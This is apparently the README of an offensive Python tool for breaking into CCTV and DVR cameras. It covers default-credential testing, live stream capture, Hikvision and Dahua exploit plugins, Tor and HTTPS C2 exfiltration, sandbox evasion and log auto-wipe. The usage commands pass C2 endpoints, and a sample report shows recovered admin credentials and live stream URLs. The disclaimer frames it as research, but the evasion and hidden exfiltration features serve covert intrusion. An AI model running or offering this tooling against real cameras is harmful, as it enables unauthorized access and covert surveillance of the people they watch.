# SurveillanceRecon - Security Research Reconnaissance Framework

**Version:** 1.0.0  
**Author:** SecOps Research Team  
**License:** Educational/Research Use Only

## ⚠️ LEGAL DISCLAIMER

This tool is designed **EXCLUSIVELY** for:
- Authorized penetration testing
- Security research on systems you own
- Educational purposes in controlled environments

**UNAUTHORIZED USE IS ILLEGAL.** The authors assume no liability for misuse. Always obtain explicit written permission before testing any system.

---

## 🔍 Overview

SurveillanceRecon is an advanced reconnaissance framework for CCTV/DVR/NVR systems with:

- **Multi-vendor fingerprinting** (Hikvision, Dahua, CP Plus, Axis, Sony, Bosch, Panasonic, Vivotek)
- **Intelligent port scanning** with service enumeration
- **Default credential testing** with vendor-aware mutations
- **Live stream validation** (RTSP, HTTP, ONVIF)
- **CVE mapping** and exploit readiness detection
- **Encrypted C2 exfiltration** (Tor + HTTPS)
- **Sandbox evasion** for operational security

---

## 📦 Installation

### Prerequisites
- Python 3.8+
- VLC or FFmpeg (for stream validation)
- Tor Browser (optional, for C2 exfiltration)

### Setup

```bash
# Clone repository
git clone https://github.com/yourusername/surveillance_recon.git
cd surveillance_recon

# Install dependencies
pip install -r requirements.txt

# Install VLC (Windows)
# Download from: https://www.videolan.org/vlc/

# Install FFmpeg (optional)
# Download from: https://ffmpeg.org/download.html
```

---

## 🚀 Usage

### Basic Scan

```bash
# Scan single IP
python -m surveillance_recon 192.168.1.100

# Scan IP range
python -m surveillance_recon 192.168.1.10-20

# Scan CIDR
python -m surveillance_recon 192.168.1.0/24
```

### Advanced Options

```bash
# Brand-specific scan
python -m surveillance_recon 192.168.1.100 --brand hikvision

# Fast mode (high-risk ports only)
python -m surveillance_recon 192.168.1.100 --fast

# Custom ports
python -m surveillance_recon 192.168.1.100 -p 80,443,554,8080

# With C2 exfiltration
python -m surveillance_recon 192.168.1.100 --c2-onion http://yoursite.onion --c2-https https://c2.example.com

# Quiet mode (logs only)
python -m surveillance_recon 192.168.1.100 --quiet

# Disable log auto-wipe
python -m surveillance_recon 192.168.1.100 --no-wipe
```

### Programmatic API

```python
import surveillance_recon

# One-liner scan
report = surveillance_recon.scan("192.168.1.100", brand="hikvision")

# Advanced usage
from surveillance_recon import ZetaReconEngine

engine = ZetaReconEngine(
    target_ip="192.168.1.100",
    port_range=[80, 443, 554, 8080],
    c2_onion="http://yoursite.onion",
    auto_wipe_logs=True
)

report = engine.run_full_recon()
print(report)
```

---

## 📁 Project Structure

```
surveillance_recon/
├── __init__.py           # Framework entry point
├── main.py               # Main execution hub
├── cli.py                # Command-line interface
├── core/                 # Core reconnaissance modules
│   ├── __init__.py       # Recon engine orchestrator
│   ├── scanner.py        # Port & service scanner
│   ├── fingerprinter.py  # Camera fingerprinting
│   ├── authenticator.py  # Credential testing
│   ├── streamer.py       # Stream validation
│   └── exfil.py          # C2 exfiltration
├── config/               # Intelligence databases
│   ├── __init__.py
│   ├── ports.py          # Port intelligence
│   ├── creds.py          # Credential database
│   └── dorks.py          # Search dork generator
├── utils/                # Utilities
│   ├── __init__.py
│   ├── logger.py         # Encrypted logger
│   ├── evasion.py        # Sandbox evasion
│   └── helpers.py        # Helper functions
├── plugins/              # Exploit plugins
│   ├── __init__.py       # Plugin loader
│   ├── hikvision_rce.py  # Hikvision exploits
│   └── dahua_backdoor.py # Dahua exploits
├── requirements.txt      # Dependencies
├── .gitignore
└── README.md
```

---

## 🛡️ Features

### 1. **Intelligent Port Scanning**
- Adaptive port selection based on vendor
- Service enumeration (HTTP, HTTPS, RTSP, ONVIF)
- Risk-based prioritization

### 2. **Deep Fingerprinting**
- Brand/model/firmware detection
- CVE mapping (36+ vulnerabilities)
- Exploit readiness assessment

### 3. **Credential Testing**
- Vendor-specific default credentials
- Context-aware mutations (IP-based, numeric)
- ONVIF user extraction

### 4. **Stream Validation**
- RTSP/HTTP/RTMP/MMS protocol support
- Live stream detection
- Screenshot capture (VLC/FFmpeg)

### 5. **Operational Security**
- Encrypted logs (AES-256)
- Auto-wipe on exit
- Sandbox/VM evasion
- Tor + HTTPS exfiltration

---

## 🎯 Supported Vendors

| Vendor      | Fingerprinting | Default Creds | CVEs | Plugins |
|-------------|----------------|---------------|------|---------|
| Hikvision   | ✅             | ✅            | 3+   | ✅      |
| Dahua       | ✅             | ✅            | 3+   | ✅      |
| CP Plus     | ✅             | ✅            | -    | -       |
| Axis        | ✅             | ✅            | 2+   | -       |
| Sony        | ✅             | ✅            | 1+   | -       |
| Bosch       | ✅             | ✅            | 1+   | -       |
| Panasonic   | ✅             | ✅            | 1+   | -       |
| Vivotek     | ✅             | ✅            | 1+   | -       |
| Generic     | ✅             | ✅            | -    | -       |

---

## 🔐 Security Notes

1. **Logs are encrypted** using AES-256 with target-derived keys
2. **Auto-wipe enabled** by default (use `--no-wipe` to disable)
3. **Sandbox evasion** triggers silent exit in VM/analysis environments
4. **C2 traffic** mimics legitimate HTTPS/GA requests
5. **No hardcoded credentials** - all data in config files

---

## 📊 Output Example

```json
{
  "target_ip": "192.168.1.100",
  "scan_time": 45.3,
  "geo": {
    "country": "United States",
    "city": "New York",
    "isp": "Example ISP"
  },
  "open_ports": [80, 554, 8080],
  "camera_candidates": [
    {
      "port": 80,
      "brand": "hikvision",
      "model": "DS-2CD2142FWD",
      "firmware": "5.5.0",
      "vulnerabilities": ["CVE-2021-36260"],
      "is_exploit_ready": true
    }
  ],
  "auth_results": {
    "80": {
      "credentials": {"username": "admin", "password": ""},
      "login_url": "http://192.168.1.100/doc/page/login.asp"
    }
  },
  "streams": [
    {
      "protocol": "RTSP",
      "stream_url": "rtsp://192.168.1.100:554/Streaming/Channels/101",
      "is_live": true,
      "screenshot_captured": true
    }
  ]
}
```

---

## 🤝 Contributing

Contributions welcome! Please:
1. Fork the repository
2. Create a feature branch
3. Submit a pull request

---

## 📜 License

**Educational/Research Use Only**

This software is provided for educational and authorized security research purposes only. Unauthorized access to computer systems is illegal. The authors are not responsible for misuse.

---

## 🔗 Resources

- [OWASP IoT Security](https://owasp.org/www-project-internet-of-things/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [CVE Database](https://cve.mitre.org/)

---

**Built with ❤️ by SecOps Research Team**

